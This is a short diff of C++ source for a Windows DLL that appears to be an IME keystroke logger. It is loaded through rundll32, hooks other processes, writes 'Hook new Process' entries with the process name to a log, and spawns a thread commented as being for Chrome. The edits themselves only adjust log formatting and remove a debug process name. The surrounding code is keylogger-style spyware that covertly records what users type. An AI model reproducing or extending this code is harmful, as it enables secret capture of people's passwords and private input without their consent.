@@ -24,7 +24,6 @@ extern "C" __declspec(dllexport) void CALLBACK IMELoggerEntry(HWND hwnd, HINSTAN
 	if (isUserAdmin()) {
 		MessageBoxW(NULL, L"IMELoggerEntry Start\r\n ", L"IMELoggerEntry", MB_OK);
 	}
-
 	else if (DEBUG) {
 		MessageBoxW(NULL, L"Please run as administrator\r\nRun without admin now ", L"IMELoggerEntry", MB_OK);
 		exit(-1);
@@ -57,7 +56,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	HANDLE hProcess = nullptr;
 	wchar_t processName[MAX_PATH] = L"<unknown>";
 	wchar_t targetProcessName[] = L"rundll32.exe";
-	wchar_t debugProcessName[] = L"Notepad.exe";
+
 
 	switch (ul_reason_for_call)
 	{
@@ -68,9 +67,9 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
 		{
 			if (_wcsicmp(processName, targetProcessName) != 0) {
-				IMEKeyInputlogger(L"\r\nHook new Process:\r\n");
+				IMEKeyInputlogger(L"\r\n--------------------\r\nHook new Process:\r\n");
 				IMEKeyInputlogger(processName);
-				IMEKeyInputlogger(L"\r\n");
+				IMEKeyInputlogger(L"\r\n--------------------\r\n");
 				// New thread for chromeMain
 				hThread = CreateThread(
 					NULL,
